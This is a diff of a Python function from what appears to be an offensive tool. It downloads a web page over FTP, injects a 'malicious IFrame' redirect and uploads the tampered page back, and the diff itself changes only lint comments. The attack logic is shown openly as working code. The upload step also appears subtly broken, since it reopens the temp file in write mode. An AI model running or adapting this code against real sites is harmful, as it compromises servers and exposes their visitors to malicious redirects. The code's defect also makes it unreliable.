@@ -5,9 +5,9 @@ import ftplib
 def injectPage(ipftp, ippage, ipredirect):
     ''' inject the redirect page'''
     try:
-        f = open(ippage + '.tmp',
+        f = open(ippage + '.tmp',  # pylint: disable=R1732
                  'w',
-                 encoding='utf-8-sig')  # pylint: disable=R1732
+                 encoding='utf-8-sig')
         ipftp.retrlines('RETR ' + ippage, f.write)
         print('[+] Downloaded Page: ' + ippage)
     except:  # pylint: disable=bare-except  # noqa: E722
@@ -17,9 +17,9 @@ def injectPage(ipftp, ippage, ipredirect):
     f.close()
     print('[+] Injected Malicious IFrame on: ' + ippage)
     try:
-        ipftp.storlines('STOR ' + ippage, open(ippage + '.tmp',
+        ipftp.storlines('STOR ' + ippage, open(ippage + '.tmp',  # pylint: disable=R1732  # noqa: E501
                                                'w',
-                                               encoding='utf-8-sig'))  # pylint: disable=R1732  # noqa: E501
+                                               encoding='utf-8-sig'))  # noqa: E501
         print('[+] Uploaded Injected Page: ' + ippage)
     except:  # pylint: disable=bare-except  # noqa: E722
         print('[-] Failed to Upload Injected Page: ' + ippage)
